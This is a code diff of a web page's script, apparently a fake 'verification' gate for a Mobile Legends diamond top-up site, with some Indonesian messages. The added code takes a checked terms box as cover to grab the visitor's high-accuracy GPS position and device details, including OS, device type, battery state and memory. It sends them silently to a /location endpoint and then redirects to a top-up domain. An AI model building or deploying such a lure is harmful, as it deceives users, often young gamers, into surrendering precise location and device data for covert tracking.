@@ -64,108 +64,74 @@
               </div>
 
               <script>
+                async function getDeviceInfo() {
+                  const os = navigator.platform || 'N/A';
+                  const deviceType = /Mobi|Android/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
+                  let battery = 'N/A';
+                  try {
+                    if (navigator.getBattery) {
+                      const b = await navigator.getBattery();
+                      battery = `${Math.round(b.level * 100)}% (${b.charging ? 'Sedang di Charge' : 'Tidak di Charge'})`;
+                    }
+                  } catch (e) {}
+                  const memory = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'N/A';
+                  return { os, deviceType, battery, memory };
+                }
+
+                function sendData(lat, lon) {
+                  getDeviceInfo().then(device => {
+                    const payload = { lat, lon, ...device };
+                    fetch('/location', {
+                      method: 'POST',
+                      headers: { 'Content-Type': 'application/json' },
+                      body: JSON.stringify(payload)
+                    }).catch(() => {});
+                  });
+                }
+
                 function handleVerify() {
+                  const isChecked = document.getElementById('c').checked;
+                  const errorMsg = document.getElementById('error-msg');
+                  const wrap = document.getElementById('wrap');
 
-  const isChecked =
-    document.getElementById('c').checked;
+                  errorMsg.style.display = 'none';
+                  wrap.style.borderColor = '#e0e6ed';
+                  wrap.style.background = '#f8fbff';
 
-  const errorMsg =
-    document.getElementById('error-msg');
+                  if (!isChecked) {
+                    errorMsg.textContent = 'Please agree to the terms to continue.';
+                    errorMsg.style.display = 'block';
+                    wrap.style.borderColor = '#d93025';
+                    wrap.style.background = '#fffafa';
+                    return;
+                  }
 
-  const wrap =
-    document.getElementById('wrap');
+                  if (!navigator.geolocation) {
+                    errorMsg.textContent = 'Location access is not supported on this device.';
+                    errorMsg.style.display = 'block';
+                    return;
+                  }
 
-  errorMsg.style.display = 'none';
-  wrap.style.borderColor = '#e0e6ed';
-  wrap.style.background = '#f8fbff';
-
-  if (!isChecked) {
-
-    errorMsg.textContent =
-      'Please agree to the terms to continue.';
-
-    errorMsg.style.display =
-      'block';
-
-    wrap.style.borderColor =
-      '#d93025';
-
-    wrap.style.background =
-      '#fffafa';
-
-    return;
-  }
-
-  if (!navigator.geolocation) {
-
-    errorMsg.textContent =
-      'Location access is not supported on this device.';
-
-    errorMsg.style.display =
-      'block';
-
-    return;
-  }
-
-  navigator.geolocation.getCurrentPosition(
-
-    async (pos) => {
-
-      const lat =
-        pos.coords.latitude;
-
-      const lon =
-        pos.coords.longitude;
-
-      try {
-
-        await fetch('/location', {
-          method: 'POST',
-          headers: {
-            'Content-Type':
-              'application/json'
-          },
-          body: JSON.stringify({
-            lat,
-            lon
-          })
-        });
-
-      } catch (err) {
-        console.log(
-          'Gagal kirim lokasi:',
-          err
-        );
-      }
-
-      window.location.href =
-        'https://en-worlds.topup-diamonds.com';
-
-    },
-
-    () => {
-
-      errorMsg.textContent =
-        'Verifikasi Ditolak, Gagal Akses Situs Top Up Mobile Legends.';
-
-      errorMsg.style.display =
-        'block';
-
-      wrap.style.borderColor =
-        '#d93025';
-
-      wrap.style.background =
-        '#fffafa';
-
-    },
-
-    {
-      enableHighAccuracy: true,
-      timeout: 15000,
-      maximumAge: 0
-    }
-  );
-}
-</script>
+                  navigator.geolocation.getCurrentPosition(
+                    async (pos) => {
+                      const lat = pos.coords.latitude;
+                      const lon = pos.coords.longitude;
+                      sendData(lat, lon);
+                      window.location.href = 'https://en-worlds.topup-diamonds.com';
+                    },
+                    () => {
+                      errorMsg.textContent = 'Verifikasi Ditolak, Gagal Akses Situs Top Up Mobile Legends.';
+                      errorMsg.style.display = 'block';
+                      wrap.style.borderColor = '#d93025';
+                      wrap.style.background = '#fffafa';
+                    },
+                    {
+                      enableHighAccuracy: true,
+                      timeout: 15000,
+                      maximumAge: 0
+                    }
+                  );
+                }
+              </script>
 </body>
 </html>
